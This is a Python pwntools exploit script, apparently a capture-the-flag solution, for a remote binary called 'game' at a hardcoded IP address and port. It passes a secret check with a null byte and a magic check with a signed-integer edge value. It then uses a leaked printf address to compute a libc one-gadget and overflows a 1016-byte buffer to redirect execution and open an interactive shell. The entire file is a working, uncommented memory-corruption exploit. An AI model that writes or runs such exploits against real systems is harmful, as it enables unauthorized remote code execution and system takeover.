from pwn import *

local = False
elf = 'game' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "140.114.77.172"
    port = 10111
    r = remote(ip,port)

context.arch = 'amd64'

### Secret
secret_payload = '\0'

r.recvuntil(':')
r.sendline(secret_payload)

### Magic
magic_payload = '-2147483648'

r.recvuntil(':')
r.sendline(magic_payload)

### Get shell
r.recvuntil(': ')
printf = r.recvline(keepends=False)
printf_offset = 0x64e80
gadget_offset = 0x4f322
payload = int(printf,16) - printf_offset + gadget_offset
print(payload)
print(hex(payload))

r.recvuntil(':')
name = '\x00'*16
r.sendline(name)

r.recvuntil('size :')
size = '2147483647'
r.sendline(size)

r.recvuntil(':')
message = '\x00'*1016 + p64(payload)
r.sendline(message)
r.interactive()
